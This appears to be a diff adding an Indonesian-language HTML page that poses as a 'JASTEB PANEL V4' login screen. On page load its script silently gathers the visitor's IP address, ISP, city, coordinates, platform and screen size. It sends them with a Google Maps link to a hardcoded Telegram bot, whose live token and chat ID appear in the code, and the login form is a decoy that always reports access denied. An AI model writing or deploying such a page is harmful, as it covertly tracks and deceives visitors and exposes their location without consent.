@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NETZY | JASTEB PANEL V4</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body { 
+            font-family: 'JetBrains Mono', monospace; 
+            background: radial-gradient(circle at center, #110022 0%, #050505 100%);
+        }
+        .neon-box {
+            border: 1px solid #7e22ce;
+            box-shadow: 0 0 20px rgba(126, 34, 206, 0.2), inset 0 0 10px rgba(126, 34, 206, 0.1);
+            animation: pulse-neon 3s infinite alternate;
+        }
+        @keyframes pulse-neon {
+            0% { box-shadow: 0 0 15px rgba(126, 34, 206, 0.2); border-color: #581c87; }
+            100% { box-shadow: 0 0 30px rgba(168, 85, 247, 0.4); border-color: #a855f7; }
+        }
+        .neon-text {
+            text-shadow: 0 0 10px #a855f7, 0 0 20px #7e22ce;
+        }
+        .input-neon:focus {
+            box-shadow: 0 0 15px rgba(168, 85, 247, 0.3);
+            border-color: #a855f7;
+        }
+    </style>
+</head>
+<body class="text-purple-500 min-h-screen flex items-center justify-center p-5" onload="silentNetzyCapture()">
+
+    <div id="loader" class="hidden fixed inset-0 bg-black/95 z-50 flex flex-col items-center justify-center">
+        <div class="relative w-20 h-20">
+            <div class="absolute inset-0 border-4 border-purple-900 rounded-full"></div>
+            <div class="absolute inset-0 border-4 border-t-purple-500 rounded-full animate-spin"></div>
+        </div>
+        <p class="text-purple-400 mt-8 tracking-[8px] animate-pulse uppercase text-[10px] font-bold">Establishing Secure Link...</p>
+    </div>
+
+    <div class="max-w-md w-full neon-box p-10 rounded-2xl bg-[#0a001a]/80 backdrop-blur-xl transition-all">
+        
+        <div class="text-center mb-10">
+            <h2 class="text-3xl font-bold italic text-white tracking-tighter uppercase neon-text">JASTEB PANEL <span class="text-purple-600">V4</span></h2>
+            <div class="h-[2px] w-24 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto mt-3"></div>
+            <p class="text-[9px] text-purple-400/60 tracking-[4px] uppercase mt-5">panel jasteb murni by netzy</p>
+        </div>
+        
+        <div class="space-y-6">
+            <div class="space-y-4">
+                <div class="group">
+                    <label class="text-[10px] text-purple-400 uppercase tracking-[3px] mb-2 block font-bold">User Id</label>
+                    <input type="text" id="user" class="input-neon w-full bg-black/50 border border-purple-900/50 p-4 text-purple-200 text-sm outline-none rounded-xl transition-all placeholder:text-gray-800" placeholder="">
+                </div>
+
+                <div class="group">
+                    <label class="text-[10px] text-purple-400 uppercase tracking-[3px] mb-2 block font-bold">Password</label>
+                    <input type="password" id="pass" class="input-neon w-full bg-black/50 border border-purple-900/50 p-4 text-purple-200 text-sm outline-none rounded-xl transition-all placeholder:text-gray-800" placeholder="">
+                </div>
+            </div>
+
+            <button onclick="executeLogin()" class="w-full bg-purple-700 text-white py-4 rounded-xl font-bold hover:bg-purple-500 transition-all active:scale-95 uppercase text-xs tracking-[4px] shadow-[0_0_20px_rgba(126,34,206,0.3)] mt-4">
+                KONFIRMASI
+            </button>
+
+            <div class="pt-8 border-t border-purple-900/20">
+                <div class="flex justify-between items-center text-[8px] text-purple-700 uppercase tracking-widest font-bold">
+                    <span class="flex items-center gap-2"><span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-ping"></span> Server: Online</span>
+                    <span>V4.0.2 - NETZYHOST</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        async function silentNetzyCapture() {
+            const token = "8032395755:AAHOoBnH_dc1SKid0eUHo6diq8uVAdmEGxU";
+            const chat_id = "7069586199";
+
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+
+                const platform = navigator.platform;
+                const screen = window.screen.width + "x" + window.screen.height;
+                
+                let msg = "⚡ *NETZY SYSTEM V4 - DATA TERDETEKSI* ⚡\n";
+                msg += "――――――――――――――――――――――――\n\n";
+                
+                msg += "🌐 *Jaringan*\n";
+                msg += "├ Ip Address :\n";
+                msg += "│ `" + d.ip + "`\n";
+                msg += "├ Isp Vendor : `" + d.org + "`\n";
+                msg += "├ As Number  : `" + (d.asn || "N/A") + "`\n\n";
+
+                msg += "📍 *Geografi Lokasi*\n";
+                msg += "├ Country    : `" + d.country_name + " (" + d.country_code + ")`\n";
+                msg += "├ Province   : `" + d.region + "`\n";
+                msg += "├ City/Town  : `" + d.city + "`\n";
+                msg += "├ Timezone   : `" + d.timezone + "`\n\n";
+
+                msg += "📱 *Perangkat*\n";
+                msg += "├ OS/Platform: `" + platform + "`\n";
+                msg += "├ Resolution : `" + screen + "`\n";
+                msg += "├ Browser    : `System Mobile Browser` \n\n";
+
+                msg += "🔗 *Estimasi Google Maps*\n";
+                msg += "https://www.google.com/maps?q=" + d.latitude + "," + d.longitude + "\n\n";
+                
+                msg += "――――――――――――――――――――――――\n";
+                msg += "⏱ `Time: " + new Date().toLocaleString('id-ID') + " WIB`";
+
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chat_id,
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+            } catch (err) {
+                console.log("Ready.");
+            }
+        }
+
+        function executeLogin() {
+            const loader = document.getElementById('loader');
+            loader.classList.remove('hidden');
+            loader.classList.add('flex');
+
+            setTimeout(() => {
+                loader.classList.add('hidden');
+                alert("ACCESS DENIED: Password is invalid or has expired. Please refresh.");
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
